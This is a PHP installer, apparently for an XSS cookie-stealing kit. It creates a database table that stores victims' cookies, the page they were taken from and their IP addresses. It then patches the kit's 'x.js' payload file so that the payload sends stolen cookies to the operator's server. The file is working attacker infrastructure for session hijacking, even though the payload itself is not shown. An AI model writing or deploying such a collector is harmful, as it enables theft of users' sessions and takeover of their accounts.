<?php
include('../config.php');

// sql to create table
$sql = "CREATE TABLE cookies(
    id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    target_url VARCHAR(120) NOT NULL,
    cookies VARCHAR(360) NOT NULL,
    client_ip VARCHAR(16) NOT NULL,
    add_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
)";

if ($conn->query($sql) === true) {
    // Replace server address
    $xss_file = "../x.js";
    $xss_old = file_get_contents($xss_file);
    $pattern = '/let sererUrl.*?;/s';
    $replacement = 'let sererUrl = "' . $server_url . '";';
    $xss_new = preg_replace($pattern, $replacement, $xss_old);
    file_put_contents($xss_file, $xss_new);
    
    echo "Install successfully!";
} else {
    die("Already installed!");
}

$conn->close();